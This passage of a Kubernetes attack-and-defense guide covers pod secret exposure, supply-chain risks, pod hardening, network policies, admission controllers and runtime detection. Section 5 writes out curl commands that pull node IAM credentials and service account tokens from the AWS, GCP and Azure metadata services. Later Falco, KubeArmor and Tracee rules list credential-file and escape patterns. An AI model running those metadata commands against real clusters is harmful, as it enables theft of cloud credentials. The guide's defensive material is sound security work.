Volume-mounted secrets are projected as files with default permissions `0644` (world-readable). If a pod has multiple containers (sidecar pattern), all containers sharing a volume can read each other's secrets.

```bash
# Default secret mount permissions
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# -rw-r--r-- 1 root root  token
# -rw-r--r-- 1 root root  ca.crt
# -rw-r--r-- 1 root root  namespace

# Even if the container runs as non-root, the token is readable
```

Set restrictive permissions:
```yaml
volumes:
- name: secret-volume
  secret:
    secretName: my-secret
    defaultMode: 0400          # Owner-read only
```

### 5.5 Cloud Provider Metadata from Pods (IMDS Access)

The Instance Metadata Service (IMDS) at `169.254.169.254` is reachable from pods unless explicitly blocked. This is a critical attack path for cloud-hosted clusters.

**AWS EKS:**
```bash
# Get node IAM role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# Returns AccessKeyId, SecretAccessKey, Token
# These are the NODE's IAM credentials — often overprivileged
```

**GCP GKE:**
```bash
# Get node service account token
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Get node service account email
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
```

**Azure AKS:**
```bash
# Get managed identity token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 5.6 Service Account to Cloud IAM Mapping

Modern managed Kubernetes services provide mechanisms to bind Kubernetes service accounts to cloud IAM roles, eliminating the need for node-level credentials. However, these mechanisms introduce their own attack vectors.

**GKE Workload Identity**
Kubernetes SA → Google Cloud SA binding. A compromised pod with a bound Workload Identity can access Google Cloud resources as that Google Cloud SA.

```bash
# Abuse: if the GCP SA has overprivileged IAM bindings
# The pod's K8s SA token is exchanged for a GCP access token
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# This returns a GCP token scoped to the bound GCP SA
# If that SA has roles/owner or roles/editor, game over for the GCP project
```

**EKS IRSA (IAM Roles for Service Accounts)**
Uses OIDC federation. The pod gets an AWS STS token via projected service account token.

```bash
# The projected token is at a custom path
cat $AWS_WEB_IDENTITY_TOKEN_FILE

# AWS SDK automatically uses this token + AWS_ROLE_ARN env var
# to call sts:AssumeRoleWithWebIdentity

# Attack: if the IAM role trust policy is too broad
# (e.g., trusts any SA in the OIDC provider, not a specific SA)
# any pod in the cluster can assume the role
```

**AKS Workload Identity**
Similar to IRSA — uses federated identity credentials. A Kubernetes SA is bound to an Azure Managed Identity or App Registration.

```bash
# Token is projected and exchanged via Azure AD
# Attack surface: overprivileged Managed Identity,
# or federated credential subject that matches too broadly
```

**Defense:** Apply least-privilege to cloud IAM roles bound to Kubernetes SAs. Never bind cloud-admin-level roles. Restrict federated identity credential subjects to specific namespace:serviceaccount pairs.

---

## 6. Supply Chain Attacks on Kubernetes

The Kubernetes supply chain includes container images, Helm charts, operators, admission webhooks, and CI/CD pipelines. Each is an attack vector.

### 6.1 Malicious Container Images

**Typosquatting in Registries**
Attackers publish images with names similar to popular images on public registries:
- `ngimx` instead of `nginx`
- `kube-prozy` instead of `kube-proxy`
- `mongo-db` instead of `mongo`

These images often function normally but include backdoors (reverse shells, cryptominers, credential stealers).

**Image Tag Mutability**
The `latest` tag (and any non-digest tag) is mutable. An attacker who compromises a registry or CI/CD pipeline can push a new image to an existing tag.

```bash
# WRONG: mutable tag
image: myregistry.io/app:latest

# RIGHT: immutable digest
image: myregistry.io/app@sha256:abc123...
```

### 6.2 Compromised Base Images with Backdoors

Backdoors inserted into widely-used base images affect all downstream images:
- Compromised package in `ubuntu:22.04` apt repository.
- Malicious layer added to a multi-stage build base.
- Trojanized runtime (e.g., Node.js binary) in a language-specific base image.

**Detection:**
- Scan images with Trivy, Grype, or Snyk before deployment.
- Use `cosign` to verify image signatures.
- Pin base images by digest, not tag.

### 6.3 Admission Webhook Manipulation

Mutating admission webhooks can modify any resource at creation or update time. An attacker who can create `MutatingWebhookConfiguration` can:
- Inject sidecar containers into every new pod.
- Modify environment variables to add exfiltration endpoints.
- Replace image references to point to attacker-controlled images.
- Add volume mounts to access host filesystems.

```yaml
# Detecting suspicious webhooks
# Look for webhooks that match on pods with broad selectors
kubectl get mutatingwebhookconfigurations -o json | \
  jq '.items[] | {name: .metadata.name, webhooks: [.webhooks[] | {name: .name, rules: .rules, url: .clientConfig.url, service: .clientConfig.service}]}'
```

### 6.4 Helm Chart Poisoning

Helm charts are packages of Kubernetes manifests with templating. A poisoned Helm chart can:
- Include post-install hooks that run privileged pods.
- Template in excessive RBAC permissions.
- Pull images from attacker-controlled registries.
- Include init containers that exfiltrate cluster data.

```bash
# Always review Helm chart templates before installing
helm template my-release suspicious-chart/ | less

# Check for:
# - privileged: true
# - hostPath mounts
# - cluster-admin bindings
# - External webhook URLs
# - Unfamiliar image registries
```

### 6.5 Operator and CRD Exploitation

Custom Resource Definitions (CRDs) and their controllers (operators) run with elevated permissions. A compromised operator has:
- Permissions to create/modify/delete custom resources and often core resources.
- A long-running pod in a privileged namespace (`kube-system` or a dedicated operator namespace).
- Service account tokens that are often overprivileged.

**Attack scenarios:**
- Compromise the operator's image registry to push a backdoored operator version.
- Exploit a vulnerability in the operator's reconciliation logic.
- Modify a CRD instance to trigger unintended operator behavior.

### 6.6 CI/CD Pipeline Compromise

CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins, Argo CD) often have credentials to push images and deploy to clusters.

**Attack chain:**
1. Compromise a developer's credentials or a CI/CD pipeline dependency.
2. Modify the pipeline to push a backdoored image.
3. The pipeline deploys the backdoored image to the cluster.
4. The backdoored pod has whatever permissions the deployment service account has.

**Defense:**
- Require image signatures and verification at admission time.
- Use Argo CD's commit verification.
- Pin all CI/CD pipeline dependencies by digest/hash.
- Use short-lived credentials for deployment (OIDC federation, not long-lived tokens).

---

## 7. Defense: Pod Security

Pod security is the first defensive layer — preventing dangerous pod configurations from being created.

### 7.1 Pod Security Standards

Kubernetes Pod Security Standards define three levels:

| Level | Description |
|-------|-------------|
| **Privileged** | Unrestricted. For system pods (CNI, CSI, kube-proxy). |
| **Baseline** | Prevents known privilege escalations. Minimal restrictions. |
| **Restricted** | Best-practice hardening. Enforces non-root, drops capabilities, requires seccomp. |

**Enforcement via Pod Security Admission (PSA):**

```yaml
# Namespace labels for PSA enforcement
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
```

**What Restricted enforces:**
- `runAsNonRoot: true`
- No privilege escalation (`allowPrivilegeEscalation: false`)
- Drop ALL capabilities, add back only specific ones
- Seccomp profile must be set (`RuntimeDefault` or `Localhost`)
- No `hostNetwork`, `hostPID`, `hostIPC`
- No `privileged` containers
- No `hostPath` volumes
- Volume types restricted to: configMap, csi, downwardAPI, emptyDir, ephemeral, persistentVolumeClaim, projected, secret
- `runAsUser` cannot be 0

### 7.2 Seccomp Profiles

Seccomp (Secure Computing Mode) filters system calls available to a container.

**RuntimeDefault Profile:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      seccompProfile:
        type: RuntimeDefault
```

**Custom Seccomp Profile:**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "mmap", "mprotect", "munmap", "brk", "ioctl",
        "access", "pipe", "select", "sched_yield", "clone",
        "execve", "exit", "wait4", "kill", "getpid",
        "socket", "connect", "accept", "sendto", "recvfrom",
        "bind", "listen", "getsockname", "getpeername",
        "futex", "epoll_create", "epoll_ctl", "epoll_wait",
        "openat", "readlinkat", "newfstatat"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

Deploy as a `Localhost` profile by placing the JSON in `/var/lib/kubelet/seccomp/profiles/` on each node, then reference it:

```yaml
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: profiles/strict-app.json
```

**Audit mode for developing profiles:**
Use `SCMP_ACT_LOG` as the default action to log blocked syscalls without killing the process, then refine.

### 7.3 AppArmor Profiles

AppArmor is a mandatory access control framework available on Debian/Ubuntu-based nodes.

```yaml
# Apply an AppArmor profile to a container
# Kubernetes 1.30+ GA field (preferred):
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-pod
spec:
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      appArmorProfile:
        type: Localhost
        localhostProfile: k8s-deny-write
---
# Pre-1.30 beta annotation form (still works for back-compat):
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-pod-legacy
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: localhost/k8s-deny-write
spec:
  containers:
  - name: app
    image: myapp:1.0
```

**Example AppArmor profile (`/etc/apparmor.d/k8s-deny-write`):**
```
#include <tunables/global>

profile k8s-deny-write flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Allow reads
  / r,
  /** r,

  # Allow execution
  /usr/bin/** ix,
  /bin/** ix,

  # Deny writes except to /tmp
  deny /** w,
  /tmp/** rw,

  # Deny mount
  deny mount,

  # Deny raw network access
  deny network raw,

  # Deny ptrace
  deny ptrace,
}
```

### 7.4 SELinux Contexts

On RHEL/CentOS-based nodes, SELinux provides mandatory access control.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: selinux-pod
spec:
  securityContext:
    seLinuxOptions:
      level: "s0:c123,c456"          # MCS labels for isolation
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      seLinuxOptions:
        type: "container_t"           # Standard container SELinux type
        level: "s0:c123,c456"
```

SELinux prevents containers from accessing files or processes with different MCS labels, even if the container is running as root.

### 7.5 RuntimeClass: gVisor and Kata Containers

For workloads requiring strong isolation beyond Linux namespaces.

**gVisor (Google)**
- Implements a user-space kernel (Sentry) that intercepts syscalls.
- Containers never directly interact with the host kernel.
- Prevents kernel exploits (DirtyPipe, DirtyCow) from affecting the host.
- Performance overhead for syscall-heavy workloads.

**Kata Containers**
- Runs each pod in a lightweight virtual machine.
- Full kernel isolation — each pod gets its own kernel.
- Higher resource overhead than gVisor but stronger isolation guarantees.

```yaml
# RuntimeClass definition for gVisor
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
---
# RuntimeClass for Kata Containers
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: kata
handler: kata-runtime
---
# Pod using gVisor
apiVersion: v1
kind: Pod
metadata:
  name: sandboxed-pod
spec:
  runtimeClassName: gvisor
  containers:
  - name: untrusted-app
    image: untrusted-workload:1.0
```

### 7.6 Security Context Best Practices

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
spec:
  # Pod-level security
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534                    # nobody
    runAsGroup: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  # Disable service account token automount
  automountServiceAccountToken: false
  containers:
  - name: app
    image: myapp:1.0@sha256:abc123...    # Pin by digest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
      # Add back only what is strictly needed
      # capabilities:
      #   add:
      #   - NET_BIND_SERVICE
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
      requests:
        cpu: "100m"
        memory: "128Mi"
    # Writable directories via emptyDir
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /var/cache
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 100Mi
  - name: cache
    emptyDir:
      sizeLimit: 50Mi
```

---

## 8. Defense: Network and Access Control

### 8.1 NetworkPolicy: Deny-by-Default

Without NetworkPolicies, all pods can communicate freely. A deny-by-default policy should be the first thing applied to every namespace.

**Default Deny All (Ingress and Egress):**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}               # Selects ALL pods in the namespace
  policyTypes:
  - Ingress
  - Egress
```

**Allow Specific Ingress:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
```

**Allow DNS Egress (Required for most pods):**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

**Block Metadata Endpoint (IMDS):**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-metadata
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32         # Block IMDS
```

### 8.2 Service Mesh mTLS: Istio and Linkerd

Service meshes enforce mutual TLS between pods, preventing:
- Network sniffing (all traffic is encrypted).
- Pod impersonation (identity is cryptographically verified).
- Unauthorized service-to-service communication.

**Istio PeerAuthentication (Strict mTLS):**
```yaml
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT
```

**Istio AuthorizationPolicy:**
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: backend-access
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  rules:
  - from:
    - source:
        principals:
        - "cluster.local/ns/production/sa/frontend-sa"
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/*"]
```

**Linkerd Authorization:**
```yaml
apiVersion: policy.linkerd.io/v1beta2
kind: Server
metadata:
  name: backend-server
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  port: 8080
  proxyProtocol: HTTP/2
---
apiVersion: policy.linkerd.io/v1beta2
kind: ServerAuthorization
metadata:
  name: frontend-only
  namespace: production
spec:
  server:
    name: backend-server
  client:
    meshTLS:
      serviceAccounts:
      - name: frontend-sa
```

### 8.3 API Server Access Restriction

**OIDC Authentication:**
```bash
# API server flags for OIDC
--oidc-issuer-url=https://accounts.google.com
--oidc-client-id=my-k8s-cluster
--oidc-username-claim=email
--oidc-groups-claim=groups
```

**Webhook Token Authentication:**
```yaml
# Webhook configuration
apiVersion: v1
kind: Config
clusters:
- name: authn-webhook
  cluster:
    server: https://authn-server.internal:8443/authenticate
    certificate-authority: /etc/kubernetes/pki/authn-ca.crt
users:
- name: kube-apiserver
  user:
    client-certificate: /etc/kubernetes/pki/apiserver-authn-client.crt
    client-key: /etc/kubernetes/pki/apiserver-authn-client.key
```

**Restricting API Server Network Access:**
- Use firewall rules to limit which IPs can reach port 6443.
- In managed services: use authorized networks / private clusters.
- Never expose the API server to the public internet without strong authentication.

### 8.4 Kubelet Authentication and Authorization

```bash
# Kubelet configuration for secure operation
# /var/lib/kubelet/config.yaml

authentication:
  anonymous:
    enabled: false                        # Disable anonymous access
  webhook:
    enabled: true                         # Use API server for authn
  x509:
    clientCAFile: /etc/kubernetes/pki/ca.crt
authorization:
  mode: Webhook                           # Use API server for authz (not AlwaysAllow)
readOnlyPort: 0                           # Disable read-only port (10255)
```

### 8.5 Admission Controllers: OPA Gatekeeper and Kyverno

Admission controllers intercept API server requests and enforce policies. OPA Gatekeeper and Kyverno are the two dominant policy engines.

**OPA Gatekeeper: Block Privileged Containers**
```yaml
# Constraint Template
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sDenyPrivileged
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sdenyprivileged

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        container.securityContext.privileged == true
        msg := sprintf("Container '%v' must not be privileged", [container.name])
      }

      violation[{"msg": msg}] {
        container := input.review.object.spec.initContainers[_]
        container.securityContext.privileged == true
        msg := sprintf("Init container '%v' must not be privileged", [container.name])
      }
---
# Constraint
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDenyPrivileged
metadata:
  name: deny-privileged-containers
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces:
    - kube-system
```

**OPA Gatekeeper: Block hostPath Volumes**
```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sdenyhostpath
spec:
  crd:
    spec:
      names:
        kind: K8sDenyHostPath
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sdenyhostpath

      violation[{"msg": msg}] {
        volume := input.review.object.spec.volumes[_]
        volume.hostPath
        msg := sprintf("Volume '%v' uses hostPath which is not allowed", [volume.name])
      }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sDenyHostPath
metadata:
  name: deny-hostpath-volumes
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces:
    - kube-system
```

**Kyverno: Block Privileged Containers**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: deny-privileged
  annotations:
    policies.kyverno.io/title: Deny Privileged Containers
    policies.kyverno.io/severity: critical
spec:
  validationFailureAction: Enforce
  background: true
  rules:
  - name: deny-privileged-containers
    match:
      any:
      - resources:
          kinds:
          - Pod
    exclude:
      any:
      - resources:
          namespaces:
          - kube-system
    validate:
      message: "Privileged containers are not allowed."
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: "!true"
          =(initContainers):
          - securityContext:
              privileged: "!true"
```

**Kyverno: Require Non-Root and Read-Only Filesystem**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-security-context
spec:
  validationFailureAction: Enforce
  rules:
  - name: require-run-as-nonroot
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Containers must run as non-root."
      pattern:
        spec:
          securityContext:
            runAsNonRoot: true
          containers:
          - securityContext:
              allowPrivilegeEscalation: false
  - name: require-readonly-rootfs
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Containers must use a read-only root filesystem."
      pattern:
        spec:
          containers:
          - securityContext:
              readOnlyRootFilesystem: true
```

**Kyverno: Require Image Digest**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-digest
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-image-digest
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Images must use a digest (sha256), not a tag."
      pattern:
        spec:
          containers:
          - image: "*@sha256:*"
          =(initContainers):
          - image: "*@sha256:*"
```

**Kyverno: Block IMDS Access via NetworkPolicy Generation**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: generate-deny-metadata-netpol
spec:
  rules:
  - name: deny-metadata-egress
    match:
      any:
      - resources:
          kinds:
          - Namespace
    exclude:
      any:
      - resources:
          namespaces:
          - kube-system
    generate:
      synchronize: true
      apiVersion: networking.k8s.io/v1
      kind: NetworkPolicy
      name: deny-metadata-endpoint
      namespace: "{{request.object.metadata.name}}"
      data:
        spec:
          podSelector: {}
          policyTypes:
          - Egress
          egress:
          - to:
            - ipBlock:
                cidr: 0.0.0.0/0
                except:
                - 169.254.169.254/32
```

---

## 9. Defense: Runtime Protection

Runtime security detects and responds to threats that bypass admission-time controls — active exploitation, container escapes in progress, and anomalous behavior.

### 9.1 Falco Rules for Kubernetes

Falco is an open-source runtime security tool using eBPF (or a kernel module) to observe syscalls and Kubernetes audit events.

**Detect Container Escape Attempts:**
```yaml
# /etc/falco/rules.d/k8s-escape-detection.yaml

# Detect nsenter usage (common escape technique)
- rule: Nsenter Used in Container
  desc: Detect nsenter execution inside a container
  condition: >
    spawned_process and
    container and
    proc.name = "nsenter"
  output: >
    Nsenter executed inside container
    (user=%user.name command=%proc.cmdline container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Detect mount inside container
- rule: Mount Inside Container
  desc: Detect mount command inside a container
  condition: >
    spawned_process and
    container and
    proc.name = "mount" and
    not proc.pname in (systemd, dockerd, containerd)
  output: >
    Mount executed inside container
    (user=%user.name command=%proc.cmdline container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]

# Detect access to sensitive host paths
- rule: Sensitive Host Path Access
  desc: >
    Detect read or write to sensitive host paths
    that may indicate container escape
  condition: >
    open_read and
    container and
    (fd.name startswith /etc/shadow or
     fd.name startswith /etc/kubernetes or
     fd.name startswith /var/lib/kubelet or
     fd.name startswith /var/run/docker.sock or
     fd.name startswith /run/containerd)
  output: >
    Sensitive file accessed from container
    (file=%fd.name user=%user.name container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL
  tags: [container, escape, filesystem]

# Detect service account token read outside of expected processes
- rule: SA Token Read By Non-Standard Process
  desc: Service account token accessed by unexpected process
  condition: >
    open_read and
    container and
    fd.name startswith /var/run/secrets/kubernetes.io and
    not proc.name in (curl, wget, kubectl, kube-proxy, coredns)
  output: >
    Service account token read by unexpected process
    (proc=%proc.name file=%fd.name container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, credential_access]

# Detect process running in host namespaces
- rule: Container Using Host PID Namespace
  desc: >
    Detect a container that can see host processes,
    indicating hostPID is enabled
  condition: >
    spawned_process and
    container and
    container.privileged = true
  output: >
    Privileged container process spawned
    (proc=%proc.name container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, privileged]

# Detect kubectl exec into pod
- rule: kubectl Exec Into Pod
  desc: Detect exec into running pod via kubectl
  condition: >
    spawned_process and
    container and
    proc.pname = "runc" and
    proc.cmdline contains "exec"
  output: >
    Exec into container detected
    (user=%user.name command=%proc.cmdline container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING
  tags: [container, execution]
```

**Falco Kubernetes Audit Log Rules:**
```yaml
# Detect secret access
- rule: K8s Secret Accessed
  desc: Detect access to Kubernetes secrets via API
  condition: >
    ka.verb in (get, list) and
    ka.target.resource = "secrets" and
    not ka.user.name in (system:kube-controller-manager, system:kube-scheduler)
  output: >
    K8s secret accessed
    (user=%ka.user.name verb=%ka.verb secret=%ka.target.name
     ns=%ka.target.namespace)
  priority: WARNING
  source: k8s_audit
  tags: [k8s, secrets, credential_access]

# Detect ClusterRoleBinding creation
- rule: ClusterRoleBinding Created
  desc: >
    Detect creation of ClusterRoleBinding which may indicate
    privilege escalation
  condition: >
    ka.verb = "create" and
    ka.target.resource = "clusterrolebindings"
  output: >
    ClusterRoleBinding created
    (user=%ka.user.name binding=%ka.target.name
     role=%ka.req.binding.role)
  priority: CRITICAL
  source: k8s_audit
  tags: [k8s, rbac, privilege_escalation]
```

### 9.2 KubeArmor Enforcement Policies

KubeArmor provides runtime security enforcement using LSM (AppArmor/SELinux/BPF-LSM).

```yaml
# Block container escape techniques
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-escape-techniques
  namespace: production
spec:
  selector:
    matchLabels:
      app: web-app
  process:
    matchPaths:
    - path: /usr/bin/nsenter
      action: Block
    - path: /usr/bin/mount
      action: Block
    - path: /usr/bin/umount
      action: Block
    matchDirectories:
    - dir: /proc/sysrq-trigger
      action: Block
  file:
    matchPaths:
    - path: /etc/shadow
      action: Block
      fromSource:
      - path: /usr/bin/cat
    - path: /var/run/docker.sock
      action: Block
    matchDirectories:
    - dir: /var/lib/kubelet/
      action: Block
      readOnly: true
  network:
    matchProtocols:
    - protocol: raw
      action: Block
```

### 9.3 Tracee: eBPF Runtime Detection

Tracee (by Aqua Security) uses eBPF to trace kernel events and detect threats.

```bash
# Run Tracee as a DaemonSet
# Key detection signatures:
# - TRC-2: Anti-debugging detected
# - TRC-3: Code injection detected
# - TRC-5: Fileless execution detected
# - TRC-7: eBPF program loaded
# - TRC-14: Container escape via cgroup release_agent
# - TRC-105: Kernel module loading

# Tracee policy for container escape detection
# tracee --policy policy.yaml
```

```yaml
# Tracee policy
apiVersion: tracee.aquasec.com/v1beta1
kind: Policy
metadata:
  name: container-escape-detection
spec:
  scope:
  - global
  rules:
  - event: security_file_open
    filters:
    - args.pathname=/etc/shadow
    - args.pathname=/etc/kubernetes/*
  - event: container_escape_cgroup
  - event: security_bpf
  - event: security_kernel_module
  - event: process_execute
    filters:
    - args.pathname=/usr/bin/nsenter
    - args.pathname=/usr/bin/mount
```

### 9.4 Image Verification at Admission

**Cosign + Kyverno: Verify Image Signatures**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
  - name: verify-cosign-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      attestors:
      - count: 1
        entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----
```

**Sigstore/Cosign Workflow:**
```bash
# Sign an image
cosign sign --key cosign.key myregistry.io/app@sha256:abc123...

# Verify an image
cosign verify --key cosign.pub myregistry.io/app@sha256:abc123...

# Attach and verify SBOM attestation
cosign attest --key cosign.key --predicate sbom.json \
  --type spdxjson myregistry.io/app@sha256:abc123...
```

### 9.5 Kubernetes Audit Logging

Configure the API server to log security-relevant events.

```yaml
# Audit policy configuration
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# Log all requests to secrets at Metadata level
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets"]

# Log exec/attach at RequestResponse level
- level: RequestResponse
  resources:
  - group: ""
    resources: ["pods/exec", "pods/attach"]

# Log RBAC changes at RequestResponse level
- level: RequestResponse
  resources:
  - group: "rbac.authorization.k8s.io"
    resources:
    - roles
    - rolebindings
    - clusterroles
    - clusterrolebindings

# Log authentication at Metadata level
- level: Metadata
  resources:
  - group: "authentication.k8s.io"
    resources: ["tokenreviews"]

# Log node/pod status at None (too noisy)
- level: None
  resources:
  - group: ""
    resources: ["endpoints", "events"]
  users:
  - "system:kube-proxy"
  - "system:nodes"

# Default: log Metadata for everything else
- level: Metadata
  omitStages:
  - RequestReceived
```

**Suspicious audit log patterns to alert on:**
```
# Queries to watch for in audit logs:

# 1. Exec into pods (potential lateral movement)
verb=create resource=pods/exec

# 2. Secret listing across namespaces (credential theft)
verb=list resource=secrets namespace=*

# 3. ClusterRoleBinding creation (privilege escalation)
verb=create resource=clusterrolebindings

# 4. Service account token creation (persistence)
verb=create resource=serviceaccounts/token

# 5. Webhook configuration changes (supply chain)
verb=create|update resource=mutatingwebhookconfigurations

# 6. Node proxy requests (kubelet bypass)
verb=create resource=nodes/proxy
```

### 9.6 Automated Response: Quarantine, Alert, Kill

**Quarantine a Suspicious Pod:**
```bash
#!/bin/bash
# quarantine-pod.sh — isolate a suspicious pod by applying a deny-all NetworkPolicy
# and cordoning the node

POD_NAME=$1
NAMESPACE=$2

# Get pod node
NODE=$(kubectl get pod "$POD_NAME" -n "$NAMESPACE" -o jsonpath='{.spec.nodeName}')

# Get pod labels for targeted NetworkPolicy
LABELS=$(kubectl get pod "$POD_NAME" -n "$NAMESPACE" -o json | \
  jq -r '.metadata.labels | to_entries | map("\(.key): \(.value)") | join("\n    ")')

# Apply deny-all NetworkPolicy targeting this specific pod
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-${POD_NAME}
  namespace: ${NAMESPACE}
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes:
  - Ingress
  - Egress
EOF

# Label the pod for quarantine
kubectl label pod "$POD_NAME" -n "$NAMESPACE" quarantine=true --overwrite

# Cordon the node to prevent new scheduling
kubectl cordon "$NODE"

# Alert
echo "[ALERT] Pod $POD_NAME in namespace $NAMESPACE quarantined on node $NODE"
echo "[ALERT] Node $NODE cordoned"

# Optional: collect forensic data before killing
kubectl logs "$POD_NAME" -n "$NAMESPACE" --all-containers > "/tmp/forensics-${POD_NAME}.log"
kubectl describe pod "$POD_NAME" -n "$NAMESPACE" >> "/tmp/forensics-${POD_NAME}.log"
```

**Falco Response Engine (Falcosidekick):**
Configure Falcosidekick to respond to Falco alerts by:
- Sending alerts to Slack/PagerDuty/email.
- Labeling suspicious pods for NetworkPolicy isolation.
- Deleting pods that trigger critical rules.
- Creating Kubernetes Events for audit trail.

```yaml
# Falcosidekick configuration snippet
kubernetes:
  enabled: true
  delete:
    enabled: true
